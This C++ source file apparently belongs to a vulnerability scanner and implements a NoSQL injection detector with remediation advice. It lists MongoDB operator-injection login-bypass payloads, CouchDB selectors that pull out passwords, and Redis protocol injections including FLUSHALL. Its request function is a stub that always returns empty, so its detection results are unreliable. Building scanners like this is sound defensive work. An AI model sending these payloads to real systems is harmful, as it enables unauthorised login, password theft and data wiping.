#include "../include/NoSQLInjectionDetector.h"
#include <sstream>

NoSQLInjectionDetector::NoSQLInjectionDetector() : VulnerabilityScanner() {
    initializePayloads();
}

void NoSQLInjectionDetector::initializePayloads() {
    // MongoDB operator injection payloads
    mongoPayloads = {
        "{\"$ne\": null}",
        "{\"$ne\": \"\"}",
        "{\"$gt\": \"\"}",
        "{\"$regex\": \".*\"}",
        "{\"$where\": \"1==1\"}",
        "{\"$where\": \"this.password.match(/.*/)\"}", 
        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
        "{\"$or\": [{}, {\"a\":\"a\"}]}",
        "{\"$and\": [{\"username\": {\"$ne\": null}}, {\"password\": {\"$ne\": null}}]}",
        "'; return true; var dummy='",
        "'; return this.password.match(/^admin/); var dummy='",
        "{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}",
        "admin'||'1'=='1",
        "{\"$func\": \"var_dump\"}",
        "{\"username\": {\"$nin\": [\"admin\"]}, \"password\": {\"$ne\": \"\"}}",
        "'; sleep(5000); var dummy='"
    };

    // CouchDB injection payloads
    couchdbPayloads = {
        "{\"selector\": {\"_id\": {\"$gt\": null}}}",
        "{\"selector\": {\"password\": {\"$regex\": \".*\"}}}",
        "{\"selector\": {\"$or\": [{}, {\"a\":\"a\"}]}}",
        "function(doc){emit(doc._id, doc)}",
        "function(doc){if(doc.password)emit(doc._id, doc.password)}"
    };

    // Redis injection payloads
    redisPayloads = {
        "\r\n*1\r\n$4\r\nKEYS\r\n$1\r\n*\r\n",
        "\r\n*1\r\n$4\r\nINFO\r\n",
        "\r\n*1\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$1\r\n*\r\n",
        "\r\n*3\r\n$3\r\nSET\r\n$4\r\ntest\r\n$5\r\nvalue\r\n",
        "\\r\\n*1\\r\\n$8\\r\\nFLUSHALL\\r\\n"
    };
}

ScanResult NoSQLInjectionDetector::scan(const std::string& target, int port) {
    ScanResult result;
    result.target = target;
    result.port = port;
    result.scannerName = getName();
    result.vulnerable = false;

    // Test MongoDB injection
    if (testMongoDBInjection(target, port)) {
        result.vulnerable = true;
        result.details = "MongoDB NoSQL injection vulnerability detected - operator injection possible";
        result.severity = "Critical";
        result.recommendation = "Use parameterized queries, validate input types, sanitize MongoDB operators";
        return result;
    }

    // Test operator injection
    if (testOperatorInjection(target, port)) {
        result.vulnerable = true;
        result.details = "NoSQL operator injection detected - $ne, $gt, $where operators exploitable";
        result.severity = "Critical";
        result.recommendation = "Whitelist allowed operators, validate input structure, use strict schemas";
        return result;
    }

    // Test JSON injection
    if (testJSONInjection(target, port)) {
        result.vulnerable = true;
        result.details = "NoSQL JSON injection detected - malicious JSON structure accepted";
        result.severity = "High";
        result.recommendation = "Validate JSON structure, sanitize nested objects, implement input validation";
        return result;
    }

    // Test CouchDB injection
    if (testCouchDBInjection(target, port)) {
        result.vulnerable = true;
        result.details = "CouchDB NoSQL injection detected - selector manipulation possible";
        result.severity = "High";
        result.recommendation = "Validate CouchDB selectors, restrict map/reduce functions";
        return result;
    }

    // Test Redis injection
    if (testRedisInjection(target, port)) {
        result.vulnerable = true;
        result.details = "Redis command injection detected - RESP protocol manipulation";
        result.severity = "Critical";
        result.recommendation = "Use Redis client libraries, validate input, disable dangerous commands";
        return result;
    }

    result.details = "No NoSQL injection vulnerabilities detected";
    result.severity = "Info";
    return result;
}

bool NoSQLInjectionDetector::testMongoDBInjection(const std::string& target, int port) {
    // Test $ne operator
    std::string response = sendNoSQLPayload(target, port, "username[$ne]=admin&password[$ne]=admin");
    if (response.find("logged in") != std::string::npos || 
        response.find("success") != std::string::npos ||
        response.find("dashboard") != std::string::npos) {
        return true;
    }

    // Test $gt operator
    response = sendNoSQLPayload(target, port, "username[$gt]=&password[$gt]=");
    if (response.find("logged in") != std::string::npos) {
        return true;
    }

    // Test $regex operator
    response = sendNoSQLPayload(target, port, "username[$regex]=.*&password[$regex]=.*");
    if (response.find("logged in") != std::string::npos) {
        return true;
    }

    return false;
}

bool NoSQLInjectionDetector::testCouchDBInjection(const std::string& target, int port) {
    // Test selector injection
    std::string response = sendNoSQLPayload(target, port, 
        "{\"selector\":{\"_id\":{\"$gt\":null}}}");
    if (response.find("docs") != std::string::npos || 
        response.find("_id") != std::string::npos) {
        return true;
    }

    return false;
}

bool NoSQLInjectionDetector::testRedisInjection(const std::string& target, int port) {
    // Test RESP protocol injection
    std::string response = sendNoSQLPayload(target, port, 
        "\\r\\n*1\\r\\n$4\\r\\nKEYS\\r\\n$1\\r\\n*\\r\\n");
    if (response.find("*") != std::string::npos || 
        response.find("$") != std::string::npos) {
        return true;
    }

    return false;
}

bool NoSQLInjectionDetector::testOperatorInjection(const std::string& target, int port) {
    // Test various MongoDB operators
    std::vector<std::string> operators = {"$ne", "$gt", "$lt", "$gte", "$lte", "$in", "$nin", "$where", "$regex"};
    
    for (const auto& op : operators) {
        std::string payload = "username[" + op + "]=test&password[" + op + "]=test";
        std::string response = sendNoSQLPayload(target, port, payload);
        
        if (response.find("error") == std::string::npos && 
            response.find("invalid") == std::string::npos &&
            !response.empty()) {
            return true;
        }
    }

    return false;
}

bool NoSQLInjectionDetector::testJSONInjection(const std::string& target, int port) {
    // Test JSON structure manipulation
    std::string payload = "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}";
    std::string response = sendNoSQLPayload(target, port, payload);
    
    if (response.find("success") != std::string::npos || 
        response.find("logged") != std::string::npos) {
        return true;
    }

    return false;
}

std::string NoSQLInjectionDetector::sendNoSQLPayload(const std::string& target, int port, const std::string& payload) {
    // Simulate HTTP request with NoSQL payload
    std::ostringstream request;
    request << "POST /login HTTP/1.1\r\n";
    request << "Host: " << target << "\r\n";
    request << "Content-Type: application/json\r\n";
    request << "Content-Length: " << payload.length() << "\r\n";
    request << "User-Agent: C3NT1P3D3-Scanner/3.0\r\n";
    request << "\r\n";
    request << payload;

    // Simulation mode - return empty
    return "";
}
